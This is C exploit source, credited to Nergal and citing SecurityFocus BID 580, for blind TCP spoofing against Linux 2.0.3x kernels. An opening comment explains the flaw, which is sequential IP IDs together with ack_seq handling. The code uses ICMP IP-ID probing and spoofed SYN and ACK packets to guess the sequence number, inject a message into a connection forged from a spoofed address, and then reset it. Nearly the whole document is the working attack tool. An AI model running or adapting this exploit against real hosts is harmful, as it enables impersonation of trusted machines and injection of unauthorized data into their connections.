/*
source: http://www.securityfocus.com/bid/580/info

Certain Linux kernels in the 2.0.3x range are susceptible to blind TCP spoofing attacks due to the way that the kernel handles invalid ack sequence numbers, and the way it assigns IDs to outgoing IP datagrams. For this vulnerability to be effective, 3 conditions have to be met: The spoofed machine must be off the network or incapable of sending data out/recieving data properly, the target machine must not be communicating actively with any other machines at the time, and no packets between the attacker's machine and the target can be dropped during the attack.

The reason this can be done is firstly due to how these kernels handle invalid ack_seq numbers. If a connection has not been established, a packet with an ack_seq too low will be ignored, and a packet with an ack_seq too high will be responded to with a reset packet. If a connection has been established, any invalid ack_seq is ignored. Whether or not a reply packet has been generated can be determined by sending ICMP echo requests, with the attacker's real IP address as the source. Linux assigns sequnetial IP IDs to all outgoing packets. Therefore, by sending an ICMP echo request probe between each spoofed packet, it is possible to determine how many packets were generated in reply to the spoof attempt.

Therefore: ICMP echo request is sent, and reply received with id=i. If a spoof attempt is made with ack_seq = a, and the next ICMP reply has an id of i+1, then no reply was generated from the spoof attempt and ack_seq is too low. However, if the ICMP reply has an id of i+2, then a response was generated and ack_seq is either too high, (reset packet sent by target) or correct (connection established). To determine which is true, another spoofed packet is sent, with a known-high ack_seq, followed by another ICMP probe. If the response to this probe has an ID incremented by two, then the known-high ack_seq resulted in a reset packet being sent, so the connection has not been successfully established. If the ICMP reply has an ID incremented by one, the known-high ack_seq was ignored, meaning that the connection has been established and the blind spoof can continue. 
*/

/* by Nergal */

  #include "libnet.h"
  #include <netinet/ip.h>
  #include <netdb.h>
  int sock, icmp_sock;
  int packid;
  unsigned int target, target_port, spoofed, spoofed_port;
  unsigned long myaddr;
  int
  get_id ()
{
    char buf[200];
    char buf2[200];
    int n;
    unsigned long addr;
    build_icmp_echo (ICMP_ECHO, 0, getpid (), 1, 0, 0, buf + IP_H);
    build_ip (ICMP_ECHO_H, 0, packid++, 0, 64, IPPROTO_ICMP, myaddr,
              target, 0, 0, buf);
    do_checksum (buf, IPPROTO_ICMP, ICMP_ECHO_H);
    write_ip (sock, buf, IP_H + ICMP_ECHO_H);
    do
      {
        n = read (icmp_sock, buf2, 200);
        addr = ((struct iphdr *) buf2)->saddr;
      }
    while (addr != target);
    return ntohs (((struct iphdr *) buf2)->id);
}

    static int first_try;


  int
  is_bigger ()
{
    static unsigned short id = 0, tmp;
    usleep (10000);
    tmp = get_id ();
    if (tmp == id + 1)
      {
        id = tmp;
        return 0;
      }
    else if (tmp == id + 2)
      {
        id = tmp;
        return 1;
      }
    else
      {
        if (first_try)
          {
            id = tmp;
            first_try = 0;
            return 0;
          }
        fprintf (stderr, "Unexpected IP id, diff=%i\n", tmp - id);
        exit (1);
      }
}

  void
  probe (unsigned int ack)
{
    char buf[200];
    usleep (10000);
    build_tcp (spoofed_port, target_port, 2, ack, 16, 32000, 0, 0, 0, buf + IP_H);
    build_ip (TCP_H, 0, packid++, 0, 64, IPPROTO_TCP, spoofed,
              target, 0, 0, buf);
    do_checksum (buf, IPPROTO_TCP, TCP_H);
    write_ip (sock, buf, IP_H + TCP_H);
}

  void
  send_data (unsigned int ack, char *rant)
{
    char * buf=alloca(200+strlen(rant));
    build_tcp (spoofed_port, target_port, 2, ack, 16, 32000, 0, rant, strlen
  (rant), buf + IP_H);
    build_ip (TCP_H + strlen (rant), 0, packid++, 0, 64, IPPROTO_TCP, spoofed,
              target, 0, 0, buf);
    do_checksum (buf, IPPROTO_TCP, TCP_H + strlen (rant));
    write_ip (sock, buf, IP_H + TCP_H + strlen (rant));
}

  void
  send_syn ()
{
    char buf[200];
    build_tcp (spoofed_port, target_port, 1, 0, 2, 32000, 0, 0, 0, buf + IP_H);
    build_ip (TCP_H, 0, packid++, 0, 64, IPPROTO_TCP, spoofed,
              target, 0, 0, buf);
    do_checksum (buf, IPPROTO_TCP, TCP_H);
    write_ip (sock, buf, IP_H + TCP_H);
}

  #define MESSAGE "Check out netstat on this host :)\n"


  void
  send_reset ()
{
    char buf[200];
    build_tcp (spoofed_port, target_port, 4 + strlen (MESSAGE), 0, 4, 32000, 0, 0,
  0, buf + IP_H);
    build_ip (TCP_H, 0, packid++, 0, 64, IPPROTO_TCP, spoofed,
              target, 0, 0, buf);
    do_checksum (buf, IPPROTO_TCP, TCP_H);
    write_ip (sock, buf, IP_H + TCP_H);
}


  #define LOTS ((unsigned int)(1<<30))
  main (int argc, char **argv)
{
    unsigned int seq_low = 0, seq_high = 0, seq_toohigh, seq_curr;
    int i;
    char myhost[100];
    struct hostent *ht;
    if (argc != 5)
      {
        printf ("usage:%s target_ip target_port spoofed_ip spofed_port\n",
  argv[0]);
        exit (1);
      }
    gethostname (myhost, 100);
    ht = gethostbyname (myhost);
    if (!ht)
      {
        printf ("Your system is screwed.\n");
        exit (1);
      }
    myaddr = *(unsigned long *) (ht->h_addr);
    target = inet_addr (argv[1]);
    target_port = atoi (argv[2]);
    spoofed = inet_addr (argv[3]);
    spoofed_port = atoi (argv[4]);
    sock = open_raw_sock (IPPROTO_RAW);
    icmp_sock = socket (AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock <= 0 || icmp_sock <= 0)
      {
        perror ("raw sockets");
        exit (1);
      }
    packid = getpid () * 256;
    fprintf(stderr,"Checking for IP id increments\n");
  first_try=1;
    for (i = 0; i < 5; i++)
      {
      is_bigger ();
      sleep(1);
      fprintf(stderr,"#");
      }
    send_syn ();
    fprintf (stderr, "\nSyn sent, waiting 33 sec to get rid of resent
  SYN+ACK...");
    for (i = 0; i < 33; i++)
      {
        fprintf (stderr, "#");
        sleep (1);
      }
    fprintf (stderr, "\nack_seq accuracy:");
  first_try=1;
    is_bigger();
    probe (LOTS);
    if (is_bigger ())
      seq_high = LOTS;
    else
      seq_low = LOTS;
    probe (2 * LOTS);
    if (is_bigger ())
      seq_high = 2 * LOTS;
    else
      seq_low = 2 * LOTS;
    probe (3 * LOTS);
    if (is_bigger ())
      seq_high = 3 * LOTS;
    else
      seq_low = 3 * LOTS;
    seq_toohigh = seq_high;
    if (seq_high == 0 || seq_low == 0)
      {
        fprintf (stderr, "Non-listening port or not 2.0.x machine\n");
        send_reset ();
        exit (0);
      }

    do
      {
        fprintf (stderr, "%i ", (unsigned int) (seq_high - seq_low));
        if (seq_high > seq_low)
          seq_curr = seq_high / 2 + seq_low / 2 + (seq_high % 2 + seq_low % 2) / 2;
        else
          seq_curr = seq_low + (unsigned int) (1 << 31) - (seq_low - seq_high) / 2;
        probe (seq_curr);
        if (is_bigger ())
          seq_high = seq_curr;
        else
          seq_low = seq_curr;
        probe (seq_toohigh);
        if (!is_bigger ())
          break;
	//      getchar();
      }
    while ((unsigned int) (seq_high - seq_low) > 1);
    fprintf (stderr, "\nack_seq=%u, sending data...\n", seq_curr);
    send_data (seq_curr, MESSAGE);
    fprintf (stderr, "Press any key to send reset.\n");
    getchar ();
    send_reset ();

}